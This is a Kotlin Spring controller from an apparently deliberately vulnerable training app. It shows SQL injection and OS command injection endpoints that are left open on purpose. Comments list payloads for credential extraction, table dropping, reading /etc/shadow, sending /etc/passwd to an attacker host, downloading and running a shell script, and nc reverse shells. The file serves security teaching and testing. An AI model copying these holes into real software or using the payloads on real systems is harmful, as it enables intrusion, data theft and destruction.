package com.kotlingoat.controllers

import com.kotlingoat.models.*
import jakarta.persistence.EntityManager
import jakarta.persistence.PersistenceContext
import org.springframework.http.ResponseEntity
import org.springframework.web.bind.annotation.*
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * VULNERABILITY CATEGORY: SQL Injection & OS Command Injection / RCE
 *
 * This controller demonstrates:
 *
 *  SQL Injection:
 *    - Classic SQLi via string concatenation in native queries
 *    - Second-order SQLi (stored and later executed)
 *    - JPQL injection via unparameterized JPQL strings
 *    - Blind boolean-based SQLi
 *    - UNION-based SQLi for data exfiltration
 *
 *  OS Command Injection / RCE:
 *    - Direct Runtime.exec() with user-controlled input
 *    - ProcessBuilder with unsanitized arguments
 *    - Shell metacharacter injection (;, |, &&, $(), backticks)
 */
@RestController
@RequestMapping("/api/inject")
class InjectionController {

    @PersistenceContext
    lateinit var em: EntityManager

    // ---------------------------------------------------------------
    // SQL Injection
    // ---------------------------------------------------------------

    /**
     * GET /api/inject/search?q=...
     *
     * VULNERABILITY (SQLi - Classic):
     * User input concatenated directly into a native SQL query.
     *
     * Attack examples:
     *   ?q=' OR '1'='1               -> returns all users
     *   ?q=' UNION SELECT id,username,password,email,4,5,6,7,8,9 FROM users --
     *                                 -> extracts all credentials
     *   ?q='; DROP TABLE users; --   -> drops the users table
     *   ?q=' OR 1=1; UPDATE users SET role='admin' WHERE username='attacker'; --
     */
    @GetMapping("/search")
    fun searchUsers(@RequestParam q: String): ResponseEntity<Any> {
        // VULNERABILITY: Direct string concatenation - classic SQL injection
        val sql = "SELECT * FROM users WHERE username LIKE '%$q%' OR email LIKE '%$q%'"
        val results = em.createNativeQuery(sql, User::class.java).resultList
        return ResponseEntity.ok(mapOf("results" to results, "query" to sql))
    }

    /**
     * GET /api/inject/user?username=...
     *
     * VULNERABILITY (SQLi - Authentication Bypass):
     * Login-style query vulnerable to authentication bypass.
     *
     * Attack:
     *   ?username=admin'--           -> logs in as admin without password
     *   ?username=' OR '1'='1'--    -> logs in as first user in DB
     */
    @GetMapping("/user")
    fun getUser(
        @RequestParam username: String,
        @RequestParam(required = false, defaultValue = "") password: String
    ): ResponseEntity<Any> {
        // VULNERABILITY: SQL injection in authentication query
        val sql = "SELECT * FROM users WHERE username='$username' AND password='$password'"
        val results = em.createNativeQuery(sql, User::class.java).resultList
        return ResponseEntity.ok(mapOf(
            "authenticated" to results.isNotEmpty(),
            "user" to results.firstOrNull(),
            "executedQuery" to sql   // VULNERABILITY: Query exposed in response
        ))
    }

    /**
     * GET /api/inject/notes?ownerId=...&sort=...
     *
     * VULNERABILITY (SQLi - Order By injection):
     * The `sort` parameter is injected into ORDER BY without sanitization.
     * ORDER BY clauses cannot use parameterized queries, making this a
     * common overlooked injection point.
     *
     * Attack:
     *   ?ownerId=1&sort=(SELECT CASE WHEN (1=1) THEN id ELSE created_at END)
     *   -> Blind boolean-based SQLi via ORDER BY
     */
    @GetMapping("/notes")
    fun getNotes(
        @RequestParam ownerId: Long,
        @RequestParam(required = false, defaultValue = "id") sort: String
    ): ResponseEntity<Any> {
        // VULNERABILITY: sort parameter injected directly into ORDER BY
        val sql = "SELECT * FROM notes WHERE owner_id = $ownerId ORDER BY $sort"
        val results = em.createNativeQuery(sql, Note::class.java).resultList
        return ResponseEntity.ok(mapOf("notes" to results))
    }

    /**
     * POST /api/inject/search/advanced
     *
     * VULNERABILITY (JPQL Injection):
     * User input concatenated into a JPQL (Java Persistence Query Language) string.
     * JPQL injection is less well-known but equally dangerous.
     *
     * Attack:
     *   {"query":"x' OR '1'='1"}
     *   -> Returns all notes
     *   {"query":"x' OR 1=1 OR title='"}
     *   -> Bypasses filter
     */
    @PostMapping("/search/advanced")
    fun advancedSearch(@RequestBody request: SearchRequest): ResponseEntity<Any> {
        // VULNERABILITY: JPQL injection - user input in JPQL string
        val jpql = "SELECT n FROM Note n WHERE n.title LIKE '%${request.query}%'"
        val results = em.createQuery(jpql, Note::class.java).resultList
        return ResponseEntity.ok(mapOf("results" to results))
    }

    /**
     * POST /api/inject/second-order
     *
     * VULNERABILITY (Second-Order SQLi):
     * User-supplied data is stored safely but retrieved and used
     * unsafely in a later query. The username is stored with escaping
     * but later retrieved and used raw in a different query.
     *
     * Attack:
     *  1. Register with username: admin'--
     *  2. Call /api/inject/second-order/execute
     *  3. The stored username is injected into the second query
     */
    @PostMapping("/second-order")
    fun storeForSecondOrder(@RequestBody body: Map<String, String>): ResponseEntity<Any> {
        val username = body["username"] ?: return ResponseEntity.badRequest().build()
        // Safe first storage (parameterized)
        em.createNativeQuery("INSERT INTO users(username, password, email, role, tenant_id, credit_balance, is_active, ssn, credit_card_number, cvv) VALUES (?, 'stored', 'stored@test.com', 'user', 1, 0, true, '', '', '')")
            .setParameter(1, username)
            .executeUpdate()
        return ResponseEntity.ok(mapOf(
            "message" to "Username stored. Now call /api/inject/second-order/execute to trigger second-order SQLi",
            "storedUsername" to username
        ))
    }

    @GetMapping("/second-order/execute")
    fun executeSecondOrder(@RequestParam storedUsername: String): ResponseEntity<Any> {
        // VULNERABILITY: Retrieves stored data and uses it unsafely (second-order SQLi)
        val sql = "SELECT * FROM notes WHERE owner_id IN (SELECT id FROM users WHERE username='$storedUsername')"
        val results = em.createNativeQuery(sql, Note::class.java).resultList
        return ResponseEntity.ok(mapOf("results" to results, "executedQuery" to sql))
    }

    // ---------------------------------------------------------------
    // OS Command Injection / RCE
    // ---------------------------------------------------------------

    /**
     * POST /api/inject/ping
     *
     * VULNERABILITY (OS Command Injection / RCE):
     * User-supplied host is passed directly to a shell command.
     * The application uses Runtime.getRuntime().exec() with a shell,
     * enabling injection of arbitrary OS commands via metacharacters.
     *
     * Attack payloads:
     *   {"host": "127.0.0.1; cat /etc/passwd"}
     *   {"host": "127.0.0.1 && whoami"}
     *   {"host": "127.0.0.1 | ls -la /"}
     *   {"host": "$(curl http://attacker.com/$(cat /etc/passwd))"}
     *   {"host": "`id`"}
     *   {"host": "127.0.0.1; nc -e /bin/sh attacker.com 4444"}  (reverse shell)
     */
    @PostMapping("/ping")
    fun pingHost(@RequestBody request: PingRequest): ResponseEntity<Any> {
        // VULNERABILITY: User input passed directly to shell via string interpolation
        // Using "sh -c" allows shell metacharacters to be interpreted
        val command = "ping -c 2 ${request.host}"

        val output = StringBuilder()
        try {
            // VULNERABILITY: Shell invocation enables ; | && || $() injection
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errorReader = BufferedReader(InputStreamReader(process.errorStream))
            reader.lines().forEach { output.appendLine(it) }
            errorReader.lines().forEach { output.appendLine(it) }
            process.waitFor()
        } catch (e: Exception) {
            output.appendLine("Error: ${e.message}")
        }

        return ResponseEntity.ok(mapOf(
            "command" to command,
            "output" to output.toString()
        ))
    }

    /**
     * POST /api/inject/nslookup
     *
     * VULNERABILITY (OS Command Injection via ProcessBuilder):
     * Even with ProcessBuilder, passing the command through a shell ("sh", "-c", ...)
     * re-enables injection. Demonstrates that ProcessBuilder is NOT automatically safe.
     *
     * Attack:
     *   {"host": "example.com; cat /etc/shadow"}
     *   {"host": "example.com\nnc attacker.com 4444 -e /bin/bash"}
     */
    @PostMapping("/nslookup")
    fun nslookup(@RequestBody request: PingRequest): ResponseEntity<Any> {
        val output = StringBuilder()
        try {
            // VULNERABILITY: ProcessBuilder with shell=true equivalent - still injectable
            val pb = ProcessBuilder("sh", "-c", "nslookup ${request.host}")
            pb.redirectErrorStream(true)
            val process = pb.start()
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            reader.lines().forEach { output.appendLine(it) }
            process.waitFor()
        } catch (e: Exception) {
            output.appendLine("Error: ${e.message}")
        }

        return ResponseEntity.ok(mapOf("output" to output.toString()))
    }

    /**
     * GET /api/inject/report?format=...&name=...
     *
     * VULNERABILITY (Command Injection via format parameter):
     * The format parameter is passed to a shell utility.
     * Commonly seen in report generation, image processing, PDF tools, etc.
     *
     * Attack:
     *   ?format=pdf&name=report; curl http://attacker.com -d @/etc/passwd
     *   ?format=$(wget -O /tmp/shell http://attacker.com/shell.sh; bash /tmp/shell.sh)
     */
    @GetMapping("/report")
    fun generateReport(
        @RequestParam format: String,
        @RequestParam name: String
    ): ResponseEntity<Any> {
        // VULNERABILITY: Both parameters injected into shell command
        val command = "echo 'Generating $name report' && ls /tmp && echo 'Format: $format'"
        val output = StringBuilder()

        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            reader.lines().forEach { output.appendLine(it) }
            process.waitFor()
        } catch (e: Exception) {
            output.appendLine("Error: ${e.message}")
        }

        return ResponseEntity.ok(mapOf("report" to output.toString(), "command" to command))
    }
}
